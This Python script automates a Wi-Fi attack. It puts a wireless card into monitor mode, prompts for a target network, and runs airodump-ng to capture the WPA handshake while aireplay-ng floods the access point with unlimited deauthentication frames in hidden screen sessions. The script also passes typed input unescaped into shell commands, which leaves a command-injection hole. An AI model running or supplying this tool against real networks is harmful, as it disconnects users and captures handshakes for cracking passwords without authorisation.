import os
import subprocess

def banner():
    print("LOGO HERE")  # Placeholder for logo
    print(" ")

def root_check():
    if os.geteuid() != 0:
        print("This script requires ROOT or SUDO privileges")
        exit()

def get_wlan_devices():
    result = subprocess.run(["ifconfig"], stdout=subprocess.PIPE, text=True)
    wlans_devices = [line.split(":")[0] for line in result.stdout.splitlines() if "wlan" in line]
    print("\n".join(wlans_devices))
    wlandev = input("Please select an interface> ").strip()

    result = subprocess.run(["ifconfig"], stdout=subprocess.PIPE, text=True)
    parent_interface = ""
    for line in result.stdout.splitlines():
        if wlandev in line:
            parent_interface = next((l.split()[2] for l in result.stdout.splitlines() if "parent" in l), "")
            break

    if not parent_interface:
        print(f"Parent interface not found for {wlandev}")
        exit()

    return wlandev, parent_interface

def airmon_on(wlandev, parent_interface):
    print(f"Placing {wlandev} into monitoring mode")
    subprocess.run(["airmon-ng", "start", parent_interface], check=True)
    print(f"{wlandev} is now in monitor mode")

def airmon_off(parent_interface):
    print("Disabling monitor mode.")
    subprocess.run(["airmon-ng", "stop", parent_interface], check=True)

def airodump_bssid(wlandev):
    subprocess.run(["airodump-ng", wlandev], check=True)
    bssid = input("Enter BSSID to attack> ").strip()
    bssidchan = input("Enter CHANNEL to attack> ").strip()
    essid = input("Enter ESSID to attack> ").strip()
    return bssid, bssidchan, essid

def air_attack(wlandev, bssid, bssidchan, essid):
    print("Launching WPA Handshake Deauth Attack")

    # Start airodump-ng in a detached screen session
    subprocess.run([
        "screen", "-dmS", "airdump_session",
        "bash", "-c",
        f"sudo airodump-ng -c {bssidchan} -w {essid} -d {bssid} {wlandev}"
    ])

    # Start aireplay-ng in a detached screen session
    subprocess.run([
        "screen", "-dmS", "aireplay_session",
        "bash", "-c",
        f"sudo aireplay-ng --deauth 0 -a {bssid} {wlandev}"
    ])
    exit()

def main():
    banner()
    root_check()

    # Get wireless interface and parent interface
    wlandev, parent_interface = get_wlan_devices()

    # Place the interface into monitoring mode
    airmon_on(wlandev, parent_interface)

    # Get BSSID, channel, and ESSID
    bssid, bssidchan, essid = airodump_bssid(wlandev)

    # Launch attack
    air_attack(wlandev, bssid, bssidchan, essid)

if __name__ == "__main__":
    main()
